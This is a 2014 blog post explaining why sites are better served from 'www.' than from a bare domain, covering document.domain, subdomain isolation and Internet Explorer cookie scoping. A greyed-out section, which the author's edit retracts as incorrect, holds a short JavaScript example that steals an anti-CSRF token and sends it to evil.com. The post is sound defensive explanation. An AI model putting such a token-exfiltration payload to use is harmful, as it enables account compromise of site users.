---
id: 194
title: 'Why you need a &#8216;www.&#8217;'
date: 2014-04-03T21:20:56+00:00
author: jsha
layout: post
guid: https://jacob.hoffman-andrews.com/README/?p=194
permalink: /why-you-need-a-www/
categories:
  - Uncategorized
---
In the early days of the internet, we named our world wide webservers &#8216;www&#8217; to distinguish them from, say, our ftp and gopher servers. Since then, the web has become the main way most people interact with the Internet, and it has started to become fashionable to omit the &#8216;www.&#8217; Sites like twitter.com and medium.com are making a statement about the modern web, and many people feel that &#8216;www&#8217; on a web site is old-fashioned and redundant.

However, for a couple of technological reasons that cropped up during the development of the web, serving your website from &#8216;www&#8217; is still advisable. If you choose to serve your site from a _bare domain_ like twitter.com, it will be harder to deal with [XSS](http://blog.codinghorror.com/protecting-your-cookies-httponly/) and you may be subject to cookie stealing. If you look around, you&#8217;ll notice that most large, web-centric technology companies use the &#8216;www,&#8217; like www.google.com, www.amazon.com, and www.facebook.com for this and other reasons.

First, assume that you will eventually implement subdomains for specific things, like support.example.com, api.example.com, beta.example.com, or blog.example.com. If you have an early-stage startup, it may seem like you&#8217;ll never need to break things out into subdomains, but if you are successful at all, you will want to use subdomains very soon.

## Subdomain Isolation

Subdomains are great because code on blog.example.com can&#8217;t access data from support.example.com. This is called the [Same-origin Policy](https://en.wikipedia.org/wiki/Same-origin_policy) and is fundamental to the security model of the web. It&#8217;s the same reason www.amazon.com can&#8217;t use Javascript to retrieve your email from mail.google.com. However, there&#8217;s a useful exception. If blog.example.com specifically wants to share data with support.example.com, it can use Javascript to set document.domain=&#8217;example.com&#8217;. The document.domain property can be set to any parent domain of the current domain, and allows any two documents that have the same document.domain to execute script in each others&#8217; context and access each others&#8217; DOM. If there&#8217;s a page on support.example.com that also sets document.domain=&#8217;example.com&#8217;, then blog.example.com can load that page in an iframe, and since the browser now considers them to have the same origin, each can run script in the context of the other and access the other&#8217;s data.

This is useful when you want it, but in general you don&#8217;t want blog.example.com to be able to share data with support.example.com. If there&#8217;s an XSS attack that affects blog.example.com, you don&#8217;t want it to also affect support.example.com, or the attacker would be able to get at your users&#8217; sensitive support tickets.

<div style="border: 1px solid red; padding: 0.5em">
  EDIT: <a href="https://twitter.com/NealPoole/status/451964029313888256">Neal Poole</a> and <a href="https://jacob.hoffman-andrews.com/README/why-you-need-a-www/#comment-2622">Eric Lawrence</a> point out that I was wrong about the part below: a page on the bare domain would also need to set document.domain. If you don&#8217;t set document.domain on your bare domain, you&#8217;re safe from this particular threat. I&#8217;ve greyed out the section so you can still what it originally said, but consider it incorrect.
</div></p> 

<div style="color: lightgrey">
  However, if the user-facing part of your site is example.com, then any of your subdomains— blog.example.com, support.example.com, etc.— can set document.domain=&#8217;example.com&#8217;. That means that an attacker script can do the same thing. That, in turn, means that what could be a minor XSS in your blogging platform or support site turns into an XSS on your entire site. In practice, this means attackers reading users&#8217; private messages, sending out self-propagating attack links from your users&#8217; accounts, and you getting paged in the middle of the night to deal with it.</p> 
  
  <p>
    An example attack payload that would run on support.example.com to steal the anti-CSRF token from the main domain might look something like this:
  </p>
  
  <pre>
var w = window.open("https://example.com");
var csrftoken = w.document.forms[0].childNodes[1].value;
new Image().src = "https://evil.com/log.png?csrftoken=" + csrftoken;
</pre>
  
  <p>
    In practice an attacker would wrap this in the necessary code to exploit an XSS vulnerability on the subdomain. In the worst case, the attackers could also steal the users&#8217; authentication cookies, but you&#8217;re <a href="http://blog.codinghorror.com/protecting-your-cookies-httponly/">already setting the HttpOnly and secure flags, right</a>?
  </p>
  
  <p>
    Even if you write all the code and operate all the servers for your subdomains, isolating major bugs like XSS is very valuable to limit damage in an (inevitable) attack. When you point subdomains at a third-party server, or contract someone else to write code that you&#8217;ll host on a subdomain, the need for isolation becomes even more clear. The fix is simple: If the user-facing part of your site is hosted on www.example.com, you&#8217;re safe from all the bugs except the ones you wrote yourself.
  </p>
</div>

## Cookie Isolation

When you host your site on example.com, you ideally to set an authentication cookie that gets sent to &#8216;example.com&#8217; and not any subdomains. It turns out it&#8217;s impossible to do this in a cross-browser way. On most browsers, sending a Set-Cookie header without a domain field will do the trick. However, [Internet Explorer differs on this point, and will send the cookie to all subdomains](http://blogs.msdn.com/b/ieinternals/archive/2009/08/20/wininet-ie-cookie-internals-faq.aspx) (see Q3).

This means that if you host on a bare domain, you&#8217;re sending your users&#8217; authentication cookies (the keys to the kingdom) to every subdomain. When you host all subdomains yourself, this is not a big deal, but once a subdomain is operated by a third party like a blogging platform or a CDN, this puts your users at unnecessary risk. If your user-facing site is www.example.com, then all cookies will by default be scoped to www.example.com on non-IE browsers, and *.www.example.com on IE. Since you&#8217;re probably not hosting anything at foo.www.example.com, you won&#8217;t be sending authentication cookies to any third party.

## Hard to Fix Later

It&#8217;s tempting to leave the switch for later, and say &#8220;We&#8217;ll add a www and a redirect once we start having subdomains.&#8221; But by the time you come back to make the change, there will be links to your site all over the web, plus internal links, and none of them point to the new \`www.&#8217; version of your site. Redirecting users when they click those links costs extra latency. It&#8217;s better to just make the call at the beginning.

## Conclusion

User-facing websites should always use \`www.&#8217; It may not be cool, but it&#8217;s safer.